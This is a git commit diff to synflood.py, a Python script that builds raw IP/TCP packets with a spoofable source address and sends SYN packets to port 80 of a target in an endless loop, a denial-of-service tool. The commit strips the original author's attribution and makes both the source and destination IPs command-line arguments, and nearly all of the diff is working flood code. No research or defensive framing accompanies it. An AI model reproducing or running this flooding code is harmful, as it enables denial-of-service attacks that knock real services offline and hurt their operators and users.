34a57fc244cbf860d472666411967b74ae36e67e
vzaffalon <zaffalonvictor@gmail.com>
2017-06-26 23:34:51 -0300

    slow loris combined with distributed code

--- synflood.py
+++ synflood.py
@@ -1,38 +1,32 @@
-'''
-    Raw sockets on Linux
-     
-    Silver Moon (m00n.silv3r@gmail.com)
-'''
- 
 # some imports
 import socket, sys
 from struct import *
 from random import randint
- 
+
 # checksum functions needed for calculation checksum
 def checksum(msg):
     s = 0
-     
+
     # loop taking 2 characters at a time
     for i in range(0, len(msg), 2):
         w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
         s = s + w
-     
+
     s = (s>>16) + (s & 0xffff);
     s = s + (s >> 16);
-     
+
     #complement and mask to 4 byte short
     s = ~s & 0xffff
-     
+
     return s
- 
+
 def makePacote (source_ip, dest_ip, tcp_source_rcv, tcp_dest_snd):
-    
-         
+
+
     # now start constructing the packet
     packet = '';
 
-     
+
     # ip header fields
     ip_ihl = 5
     ip_ver = 4
@@ -45,12 +39,12 @@ def makePacote (source_ip, dest_ip, tcp_source_rcv, tcp_dest_snd):
     ip_check = 0    # kernel will fill the correct checksum
     ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
     ip_daddr = socket.inet_aton ( dest_ip )
-     
+
     ip_ihl_ver = (ip_ver << 4) + ip_ihl
-     
+
     # the ! in the pack format string means network order
     ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
-     
+
     # tcp header fields
     tcp_source = tcp_source_rcv   # source port
     tcp_dest = tcp_dest_snd   # destination port
@@ -67,32 +61,32 @@ def makePacote (source_ip, dest_ip, tcp_source_rcv, tcp_dest_snd):
     tcp_window = socket.htons (5840)    #   maximum allowed window size
     tcp_check = 0
     tcp_urg_ptr = 0
-     
+
     tcp_offset_res = (tcp_doff << 4) + 0
     tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
-     
+
     # the ! in the pack format string means network order
     tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
-     
+
     # pseudo header fields
     source_address = socket.inet_aton( source_ip )
     dest_address = socket.inet_aton(dest_ip)
     placeholder = 0
     protocol = socket.IPPROTO_TCP
     tcp_length = len(tcp_header)
-     
+
     psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
     psh = psh + tcp_header
-     
+
     tcp_check = checksum(psh)
     #print tcp_checksum
-     
+
     # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
     tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)
-     
+
     # final full packet - syn packets dont have any data
     packet = ip_header + tcp_header
-    
+
     return packet
 
 #create a raw socket
@@ -107,10 +101,11 @@ except socket.error , msg:
 
 port_num = 10000
 porta_destino = 80
-print sys.argv[1]
+ipFonte = sys.argv[1]
+ipDestino = sys.argv[2]
+print "Syn Flood Iniciado com ipFonte " + ipFonte + " ipDestino " + ipDestino + " portaDestino " + "80"
 while (1):
-    packet = makePacote("192.168.0.106", sys.argv[1], port_num%65535, porta_destino)
+    packet = makePacote(ipFonte, ipDestino, port_num%65535, porta_destino)
     #Send the packet finally - the port specified has no effect
     s.sendto(packet, (sys.argv[1] , 0 ))    # put this in a loop if you want to flood the target
     port_num += 1
-
